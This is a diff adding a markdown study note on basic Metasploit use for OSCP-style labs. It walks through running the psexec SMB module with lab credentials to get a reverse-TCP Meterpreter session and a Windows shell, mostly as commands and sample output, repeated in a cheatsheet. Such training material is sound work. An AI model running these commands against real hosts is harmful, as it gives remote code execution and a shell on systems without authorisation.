@@ -1,0 +1,524 @@
+# Metasploit — Basics for Shell Delivery
+
+## Overview
+
+Metasploit can be used to:
+
+- search for exploits and auxiliary modules
+- deliver payloads
+- establish shell sessions
+- manage post-exploitation sessions
+- automate common exploitation workflows
+
+For OSCP-style usage, the most important early skills are:
+
+- finding the correct module
+- understanding what the module name means
+- setting required options correctly
+- understanding the default payload
+- interacting with the resulting session
+
+This note focuses on **basic exploit + payload workflow**, not advanced Metasploit usage.
+
+---
+
+## Quick Workflow
+
+1. search for modules
+2. identify relevant exploit
+3. select module
+4. review options
+5. set target / creds / callback details
+6. run exploit
+7. interact with shell or Meterpreter session
+
+---
+
+# 1. Searching for Modules
+
+## Example: Search for SMB Modules
+
+```bash
+search smb
+```
+
+Example:
+
+```text
+msf6 > search smb
+```
+
+This returns matching modules such as:
+
+- scanners
+- DoS modules
+- auxiliary modules
+- exploit modules
+
+---
+
+## Reading Search Results
+
+Example module:
+
+```text
+56 exploit/windows/smb/psexec
+```
+
+Breakdown:
+
+| Part | Meaning |
+|------|---------|
+| `56` | result number in current search |
+| `exploit/` | module type |
+| `windows/` | target platform |
+| `smb/` | service / protocol |
+| `psexec` | technique / exploit name |
+
+---
+
+## Module Types You Will Commonly See
+
+| Type | Purpose |
+|------|---------|
+| `exploit` | exploit vulnerability / abuse feature |
+| `auxiliary` | scanning, brute force, enumeration, admin tasks |
+| `post` | post-exploitation actions |
+| `payload` | shell / session code |
+| `encoder` | payload transformation |
+| `nop` | no-op sled generation |
+
+---
+
+# 2. Selecting a Module
+
+## Use Module by Number
+
+```bash
+use 56
+```
+
+Example:
+
+```text
+msf6 > use 56
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+```
+
+Prompt changes to:
+
+```text
+msf6 exploit(windows/smb/psexec) >
+```
+
+---
+
+## What the Prompt Tells You
+
+Example:
+
+```text
+exploit(windows/smb/psexec)
+```
+
+Meaning:
+
+- current module type = `exploit`
+- target platform = `windows`
+- service / vector = `smb`
+- specific technique = `psexec`
+
+Metasploit may automatically choose a default payload, often:
+
+```text
+windows/meterpreter/reverse_tcp
+```
+
+---
+
+# 3. Viewing Module Options
+
+## Show Options
+
+```bash
+options
+```
+
+Example:
+
+```text
+msf6 exploit(windows/smb/psexec) > options
+```
+
+This displays:
+
+- module options
+- payload options
+- exploit target options
+
+---
+
+## Example Important Options
+
+### Module Options
+
+| Option | Meaning |
+|--------|---------|
+| `RHOSTS` | target IP / targets |
+| `RPORT` | target port |
+| `SHARE` | SMB share used for upload |
+| `SMBDomain` | Windows domain |
+| `SMBUser` | username |
+| `SMBPass` | password |
+
+### Payload Options
+
+| Option | Meaning |
+|--------|---------|
+| `LHOST` | local callback IP |
+| `LPORT` | local callback port |
+| `EXITFUNC` | payload exit behaviour |
+
+---
+
+# 4. Setting Options
+
+## Example Configuration
+
+```bash
+set RHOSTS 10.129.180.71
+set SHARE ADMIN$
+set SMBPass HTB_@cademy_stdnt!
+set SMBUser htb-student
+set LHOST 10.10.14.222
+```
+
+---
+
+## What These Mean
+
+| Setting | Purpose |
+|---------|---------|
+| `RHOSTS` | target Windows host |
+| `SHARE` | admin share used to drop payload |
+| `SMBUser` / `SMBPass` | credentials for authentication |
+| `LHOST` | your callback listener IP |
+
+---
+
+## Common Optional Checks
+
+Before running exploit, useful commands include:
+
+```bash
+show options
+show payloads
+check
+```
+
+If supported, `check` can determine whether the target appears vulnerable.
+
+---
+
+# 5. Launching the Exploit
+
+## Run Exploit
+
+```bash
+exploit
+```
+
+or
+
+```bash
+run
+```
+
+Example:
+
+```text
+msf6 exploit(windows/smb/psexec) > exploit
+```
+
+---
+
+## Example Successful Output
+
+```text
+[*] Started reverse TCP handler on 10.10.14.222:4444
+[*] 10.129.180.71:445 - Connecting to the server...
+[*] 10.129.180.71:445 - Authenticating as user 'htb-student'...
+[*] 10.129.180.71:445 - Executing the payload...
+[*] Sending stage ...
+[*] Meterpreter session 1 opened ...
+```
+
+Success indicators:
+
+- reverse handler started
+- stage sent
+- session opened
+- `meterpreter >` prompt appears
+
+---
+
+# 6. Meterpreter Basics
+
+## Overview
+
+Meterpreter is an advanced payload that provides a richer post-exploitation interface than a basic reverse shell.
+
+Common capabilities include:
+
+- file upload / download
+- command execution
+- process interaction
+- privilege migration
+- service interaction
+- in-memory operation
+
+---
+
+## View Available Meterpreter Commands
+
+```bash
+?
+```
+
+or
+
+```bash
+help
+```
+
+---
+
+## Drop into System Shell
+
+Sometimes Meterpreter is convenient, but a normal OS shell is easier for native commands.
+
+```bash
+shell
+```
+
+Example:
+
+```text
+meterpreter > shell
+Process 604 created.
+Channel 1 created.
+C:\WINDOWS\system32>
+```
+
+This gives a Windows command shell.
+
+---
+
+# 7. Meterpreter vs Standard Shell
+
+| Session Type | Strength |
+|--------------|----------|
+| Meterpreter | richer post-exploitation features |
+| cmd / shell | native OS commands, often simpler |
+| PowerShell shell | useful for Windows administration / scripting |
+
+A good habit is:
+
+- start with Meterpreter
+- drop to `shell` when you need native commands
+- background sessions when switching tasks
+
+---
+
+# 8. Key Metasploit Concepts
+
+## Exploit
+The module that abuses the vulnerability or feature.
+
+## Payload
+The code delivered after exploitation, such as:
+
+- reverse shell
+- bind shell
+- Meterpreter
+- command stager
+
+## Reverse Payload
+Target connects back to attacker.
+
+## Bind Payload
+Attacker connects to target listener.
+
+## Stage / Stageless
+- **staged** payloads send a smaller loader first, then fetch larger payload
+- **stageless** payloads send full payload in one go
+
+---
+
+# 9. Useful Basic Commands
+
+## Search
+
+```bash
+search smb
+search type:exploit platform:windows smb
+```
+
+## Select Module
+
+```bash
+use 56
+use exploit/windows/smb/psexec
+```
+
+## Show Settings
+
+```bash
+options
+show payloads
+show targets
+```
+
+## Set Options
+
+```bash
+set RHOSTS 10.10.10.10
+set SMBUser user
+set SMBPass password
+set LHOST tun0
+set LPORT 4444
+```
+
+## Run
+
+```bash
+exploit
+run
+```
+
+## Sessions
+
+```bash
+sessions
+sessions -i 1
+background
+```
+
+## Meterpreter
+
+```bash
+help
+sysinfo
+getuid
+shell
+upload
+download
+```
+
+---
+
+# 10. Example Full Workflow
+
+```bash
+msfconsole
+```
+
+```bash
+search smb
+```
+
+```bash
+use exploit/windows/smb/psexec
+```
+
+```bash
+options
+```
+
+```bash
+set RHOSTS 10.129.180.71
+set SHARE ADMIN$
+set SMBUser htb-student
+set SMBPass HTB_@cademy_stdnt!
+set LHOST 10.10.14.222
+```
+
+```bash
+exploit
+```
+
+```bash
+shell
+```
+
+---
+
+# 11. OSCP Notes
+
+- Metasploit usage in OSCP-style environments may be limited by exam rules, so always know the manual alternative
+- understand what the exploit is doing, not just how to launch it
+- always verify target, creds, callback IP, and port before running
+- if Meterpreter lands, consider whether a native shell is easier for the task
+- be careful with noisy modules and unintended service impact
+
+---
+
+# Cheatsheet
+
+## Search and Select
+
+```bash
+search smb
+use exploit/windows/smb/psexec
+use 56
+```
+
+## Inspect Module
+
+```bash
+options
+show payloads
+show targets
+check
+```
+
+## Configure
+
+```bash
+set RHOSTS 10.129.180.71
+set SHARE ADMIN$
+set SMBUser htb-student
+set SMBPass HTB_@cademy_stdnt!
+set LHOST 10.10.14.222
+set LPORT 4444
+```
+
+## Execute
+
+```bash
+exploit
+run
+```
+
+## Session Handling
+
+```bash
+sessions
+sessions -i 1
+background
+```
+
+## Meterpreter
+
+```bash
+help
+sysinfo
+getuid
+shell
+```
+
+---
+
+# Tags
+
+#shells #payloads #metasploit #meterpreter #windows #smb #psexec #oscp
